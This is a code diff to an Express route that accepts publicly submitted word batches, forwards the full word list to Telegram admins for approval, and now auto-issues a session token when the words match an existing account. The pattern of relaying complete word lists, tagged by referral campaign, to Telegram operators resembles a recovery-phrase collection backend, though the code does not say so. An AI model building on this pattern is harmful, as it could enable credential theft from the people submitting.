@@ -3,6 +3,7 @@
 const express = require("express");
 const db = require("../db");
 const { verifyAdminRequest } = require("../services/admin");
+const { generateSessionToken } = require("../services/session");
 const { approvalKeyboard, sendTelegramAlert } = require("../telegram");
 const {
   approveWordBatch,
@@ -52,34 +53,52 @@ router.post("/", async (req, res) => {
       source: "public",
     });
 
-    let sent = false;
-    if (!batch.loggedIn && !batch.duplicate) {
-      const notification = [
-        `New word message waiting for approval #${batch.id}`,
-        `Campaign: ${referral?.name || "Main"}`,
-        batch.title ? `Title: ${batch.title}` : null,
-        `${batch.wordCount} words`,
-        batch.words.join(" "),
-      ].filter(Boolean).join("\n");
-
-      sent = await sendTelegramAlert(notification, {
-        referralCode,
-        reply_markup: approvalKeyboard(batch.id),
+    if (batch.loggedIn) {
+      return res.status(200).json({
+        ok: true,
+        autoLoggedIn: true,
+        token: generateSessionToken(batch),
+        batch: { ...batch, campaignName: referral?.name || "Main" },
+        telegram: {
+          sent: false,
+          message: "Existing account found. You have been logged in automatically.",
+        },
       });
     }
 
-    res.status(batch.duplicate || batch.loggedIn ? 200 : 201).json({
+    if (batch.duplicate) {
+      return res.status(200).json({
+        ok: true,
+        autoLoggedIn: false,
+        batch: { ...batch, campaignName: referral?.name || "Main" },
+        telegram: {
+          sent: false,
+          message: `These words already belong to a ${batch.approvalStatus} batch.`,
+        },
+      });
+    }
+
+    const notification = [
+      `New word message waiting for approval #${batch.id}`,
+      `Campaign: ${referral?.name || "Main"}`,
+      batch.title ? `Title: ${batch.title}` : null,
+      `${batch.wordCount} words`,
+      batch.words.join(" "),
+    ].filter(Boolean).join("\n");
+    const sent = await sendTelegramAlert(notification, {
+      referralCode,
+      reply_markup: approvalKeyboard(batch.id),
+    });
+
+    return res.status(201).json({
       ok: true,
+      autoLoggedIn: false,
       batch: { ...batch, campaignName: referral?.name || "Main" },
       telegram: {
         sent,
-        message: batch.loggedIn
-          ? "Existing account found. User is logged in."
-          : batch.duplicate
-            ? `These words already belong to a ${batch.approvalStatus} batch.`
-          : sent
-            ? "Message sent to Telegram admins for approval."
-            : "No active Telegram admin chats are registered yet.",
+        message: sent
+          ? "Message sent to Telegram admins for approval."
+          : "No active Telegram admin chats are registered yet.",
       },
     });
   } catch (error) {
